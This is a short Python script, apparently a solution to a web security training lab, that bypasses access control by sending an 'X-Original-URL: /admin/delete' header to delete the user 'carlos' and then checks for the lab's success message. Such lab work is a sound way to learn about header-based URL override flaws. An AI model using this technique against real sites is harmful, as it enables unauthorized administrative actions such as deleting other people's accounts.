import requests as rs
import sys 
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def delete_user(s,url):
    
    delete_carlos_user_url = url + '/?username=carlos'
    headers = {
        'X-Original-URL' : '/admin/delete'
    }
    r = s.get(delete_carlos_user_url,headers=headers,verify=False,proxies=proxies)
    
    # verify if user was deleted
    r = s.get(url,verify=False,proxies=proxies)
    resp = r.text
    if 'Congratulations, you solved the lab!'  in resp:
        sys.stdout.write("[+] Carlos user deleted successfully\n")
    else:
        sys.stdout.write("[-] Carlos user not deleted\n")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]
    delete_user(s,url)    


if __name__ == '__main__':
    main()